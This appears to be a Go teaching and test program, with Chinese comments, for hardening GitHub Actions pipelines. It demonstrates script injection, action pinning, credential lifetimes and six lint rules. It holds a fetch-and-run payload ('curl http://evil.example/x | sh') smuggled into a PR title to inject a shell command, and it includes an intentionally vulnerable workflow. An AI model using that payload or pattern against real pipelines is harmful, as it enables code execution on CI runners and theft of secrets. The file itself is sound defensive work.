// CI 流水线加固（Go 版）：脚本注入渲染、action 固定、凭据窗口、六条 lint 规则。
// 与 Python 版同一套判据与判定结果。
package main

import (
	"fmt"
	"os"
	"regexp"
	"strings"
)

const dangerous = "curl http://evil.example/x | sh"

// 攻击者把 PR 标题写成 a"; curl ... | sh #
var attackerTitle = `a"; ` + dangerous + ` #`

var untrustedExpr = regexp.MustCompile(`\$\{\{\s*github\.event\.[^}]+\}\}`)
var untrustedRef = regexp.MustCompile(`(\$\{\{\s*github\.event\.[^}]+\}\})`)
var shaPin = regexp.MustCompile(`@[0-9a-f]{40}$`)

// renderRun 渲染 run 步骤。
//   interpolate：把表达式就地替换进脚本文本（危险）
//   env        ：值进入 env，脚本只引用 $TITLE（GitHub 推荐）
func renderRun(tmpl, value, style string) (string, map[string]string) {
	switch style {
	case "interpolate":
		return untrustedExpr.ReplaceAllLiteralString(tmpl, value), map[string]string{}
	case "env":
		return untrustedExpr.ReplaceAllLiteralString(tmpl, "$TITLE"),
			map[string]string{"TITLE": value}
	}
	panic("unknown style " + style)
}

// outsideQuotesContains：marker 是否出现在引号之外。
// 按 '"' 切分，偶数下标段即引号外 —— 只有引号外才会被 shell 当命令执行。
func outsideQuotesContains(script, marker string) bool {
	for i, seg := range strings.Split(script, `"`) {
		if i%2 == 0 && strings.Contains(seg, marker) {
			return true
		}
	}
	return false
}

// ---- action 固定 ----

const officialSHA = "a1b2c3d4e5f60718293a4b5c6d7e8f9012345678"

func resolveAction(ref string, moved bool) string {
	if shaPin.MatchString(ref) { // 完整 SHA：不可变
		return ref[strings.IndexByte(ref, '@')+1:]
	}
	if moved { // tag 可被拿到仓库写权限的人移动
		return "0000000000000000000000000000000000000bad"
	}
	return officialSHA
}

// ---- 凭据生命周期 ----

const (
	longLivedTTL = 10 * 365 * 24 * 3600
	oidcTTL      = 15 * 60
	leakAt       = 120
)

func exposureWindow(ttl, leak int) int {
	if ttl-leak < 0 {
		return 0
	}
	return ttl - leak
}

// ---- 流水线 lint ----

type Job struct {
	Run                   string
	CheckoutRef           string
	UsesCache             bool
	Actions               []string
	LongLivedCloudSecret  bool
}

type Workflow struct {
	Name        string
	On          []string
	Permissions interface{} // nil / "write-all" / map[string]string
	Jobs        []Job
}

type finding struct {
	severity, id, msg string
}

func isPrivileged(on []string) (bool, string) {
	for _, t := range on {
		if t == "pull_request_target" || t == "workflow_run" {
			return true, t
		}
	}
	return false, ""
}

func lint(w Workflow) []finding {
	out := []finding{}
	priv, which := isPrivileged(w.On)
	for _, j := range w.Jobs {
		if j.Run != "" && untrustedExpr.MatchString(j.Run) {
			out = append(out, finding{"CRITICAL", "R1-script-injection",
				"不受信任表达式被拼进 run 脚本文本；改用 env 中间变量或 action 参数"})
		}
		if priv && j.CheckoutRef != "" && untrustedRef.MatchString(j.CheckoutRef) {
			out = append(out, finding{"CRITICAL", "R2-untrusted-checkout",
				"特权触发器 " + which + " 检出了 PR 头代码"})
		}
		if priv && j.UsesCache {
			out = append(out, finding{"HIGH", "R3-cache-poisoning",
				"特权工作流与其他特权触发器共享主分支缓存，可能被投毒"})
		}
	}
	if w.Permissions == nil {
		out = append(out, finding{"MEDIUM", "R4-token-permissions",
			"GITHUB_TOKEN 未做最小权限配置；默认应为只读，按需在 job 上提升"})
	} else if s, ok := w.Permissions.(string); ok && s == "write-all" {
		out = append(out, finding{"MEDIUM", "R4-token-permissions",
			"GITHUB_TOKEN 权限为 write-all；应设置最小必需权限"})
	}
	for _, j := range w.Jobs {
		for _, a := range j.Actions {
			if strings.HasPrefix(a, "third-party/") && !shaPin.MatchString(a) {
				out = append(out, finding{"MEDIUM", "R5-unpinned-action",
					a + " 未固定到完整 commit SHA；tag 可被移动或删除"})
			}
		}
		if j.LongLivedCloudSecret {
			out = append(out, finding{"MEDIUM", "R6-long-lived-secret",
				"使用长期云凭据；改用 OIDC 换取短期、范围受限的令牌"})
		}
	}
	return out
}

func ids(fs []finding) []string {
	out := []string{}
	for _, f := range fs {
		out = append(out, f.id)
	}
	return out
}

var badWorkflow = Workflow{
	Name: "bad", On: []string{"pull_request_target"}, Permissions: nil,
	Jobs: []Job{{
		Run:                  `echo "title: ${{ github.event.pull_request.title }}"`,
		CheckoutRef:          "${{ github.event.pull_request.head.sha }}",
		UsesCache:            true,
		Actions:              []string{"third-party/publish@v3"},
		LongLivedCloudSecret: true,
	}},
}

var goodWorkflow = Workflow{
	Name: "good", On: []string{"pull_request"},
	Permissions: map[string]string{"contents": "read"},
	Jobs: []Job{{
		Run:     `echo "title: $TITLE"`,
		Actions: []string{"third-party/publish@" + officialSHA},
	}},
}

func hasID(fs []finding, id string) bool {
	for _, f := range fs {
		if f.id == id {
			return true
		}
	}
	return false
}

func main() {
	fail := 0
	check := func(label string, cond bool, detail string) {
		if !cond {
			fmt.Println("FAIL:", label, detail)
			fail++
		}
	}
	tmpl := `echo "PR title: ${{ github.event.pull_request.title }}"`

	// 1) 注入
	naive, envNaive := renderRun(tmpl, attackerTitle, "interpolate")
	safe, envSafe := renderRun(tmpl, attackerTitle, "env")
	check("就地插值把载荷写进脚本", strings.Contains(naive, dangerous), naive)
	check("载荷落在引号外", outsideQuotesContains(naive, "curl"), naive)
	check("env 方式脚本无载荷", !strings.Contains(safe, dangerous), safe)
	check("env 方式值进环境变量", envSafe["TITLE"] == attackerTitle, "")
	check("env 方式引用 $TITLE", strings.Contains(safe, "$TITLE"), safe)
	check("插值方式不产生 env", len(envNaive) == 0, "")
	benign, _ := renderRun(tmpl, "refactor: cleanup", "interpolate")
	check("正常标题不构成注入", !outsideQuotesContains(benign, "curl"), benign)

	// 2) 固定
	tag := "third-party/publish@v3"
	check("tag 正常解析", resolveAction(tag, false) == officialSHA, "")
	check("tag 被移动后变化", resolveAction(tag, true) != officialSHA, "")
	check("SHA 固定不受影响",
		resolveAction("third-party/publish@"+officialSHA, true) == officialSHA, "")

	// 3) 凭据窗口
	check("OIDC 窗口远小于长期 secret",
		exposureWindow(oidcTTL, leakAt) < exposureWindow(longLivedTTL, leakAt)/1000, "")
	check("超过 TTL 归零", exposureWindow(oidcTTL, oidcTTL+1) == 0, "")

	// 4) lint
	bad := ids(lint(badWorkflow))
	fmt.Println("bad findings:", bad)
	check("坏流水线 6 条", len(bad) == 6, fmt.Sprint(bad))
	for _, rid := range []string{"R1-script-injection", "R2-untrusted-checkout",
		"R3-cache-poisoning", "R4-token-permissions", "R5-unpinned-action",
		"R6-long-lived-secret"} {
		found := false
		for _, b := range bad {
			if b == rid {
				found = true
			}
		}
		check("坏流水线命中 "+rid, found, "")
	}
	good := lint(goodWorkflow)
	check("好流水线零告警", len(good) == 0, fmt.Sprint(ids(good)))

	// 5) 规则可单独触发
	base := Workflow{Name: "x", On: []string{"pull_request"},
		Permissions: map[string]string{"contents": "read"},
		Jobs:        []Job{{Run: "echo hi"}}}
	check("只改 run → 只出 R1",
		fmt.Sprint(ids(lint(Workflow{Name: "x", On: base.On, Permissions: base.Permissions,
			Jobs: []Job{{Run: `echo "${{ github.event.pull_request.title }}"`}}}))) ==
			"[R1-script-injection]", "")
	cached := lint(Workflow{Name: "x", On: base.On, Permissions: base.Permissions,
		Jobs: []Job{{Run: "echo hi", UsesCache: true}}})
	check("非特权+缓存 -> 不出 R3", !hasID(cached, "R3-cache-poisoning"), fmt.Sprint(ids(cached)))

	if fail > 0 {
		fmt.Printf("FAILED %d\n", fail)
		os.Exit(1)
	}
	fmt.Println("all checks passed")
}
